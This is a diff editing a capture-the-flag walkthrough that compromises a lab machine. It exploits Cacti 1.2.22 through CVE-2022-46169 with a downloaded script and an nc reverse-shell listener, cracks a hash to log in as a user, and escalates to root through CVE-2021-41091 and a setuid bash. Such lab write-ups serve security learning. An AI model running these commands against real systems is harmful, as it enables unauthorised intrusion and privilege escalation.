@@ -3,7 +3,7 @@ Continued with 'nmap -p- 10.10.11.211' to find all open ports for further scanni
 Next, I used 'nmap -sVC -p22,80 10.10.11.211' to find out the versions of services and headers to the web server.
 There is a login page running on cacti version 1.2.22. Looking at the source code there is a lot of JavaScript variables for some reason. 
 No plain username or passwords thought. 
-Searching 'cacti 1.2.22 exploit' finds a github page that has 'CVE-2022-46169' exploit script for this cacti version.
+Searching 'cacti 1.2.22 exploit' finds a GitHub page that has 'CVE-2022-46169' exploit script for this cacti version.
 I downloaded it to my pc with 'wget https://raw.githubusercontent.com/FredBrave/CVE-2022-46169-CACTI-1.2.22/main/CVE-2022-46169.py'.
 Started an nc listener with 'nc -lvnp 4444' and ran the script with 'python3 CVE-2022-46169.py -u http://10.10.11.211 --LHOST=10.10.16.34 --LPORT=4444'.
 It worked and I'm in as 'www-data'!
@@ -21,8 +21,11 @@ Cracking the hash started with 'hashid -m "<hash>"' it shows the type of the has
 I can now use a cracked password to shh as marcus to the target.
 
 There is user.txt in '/home/marcus'.
-Uploaded lse.sh again to enumerate the target. Didn't find anything interesting other than marcu's mail.
-There seems to be multiple vulnerabilities on the machine. 
-CVE-2021-33033, CVE-2020-25706 and CVE-2021-41091. Kerner exploits are mostly unstable, cacti has already been upgraded to 1.2.22 from 1.2.13 
+Uploaded lse.sh again to enumerate the target. Didn't find anything interesting other than marcus's mail.
+There seem to be multiple vulnerabilities on the machine. 
+CVE-2021-33033, CVE-2020-25706 and CVE-2021-41091. Kerner exploits are mostly unstable, cacti have been upgraded to 1.2.22 from 1.2.13 already 
 but the last one seems promising. 
-Searching CVE-2021-41091 finds a github script again but the exploit seems easy enough to run without the script.
+There was a python script to be found on GitHub.
+'chmod u+s /bin/bash' on the container 
+Uploaded the script to host. 'chmod +x exp.sh' and ran it. Didn't spawn a shell so cd'd to the directory and used './bin/bash -p' to gain root.
+The flag was in '/root/root.txt'.
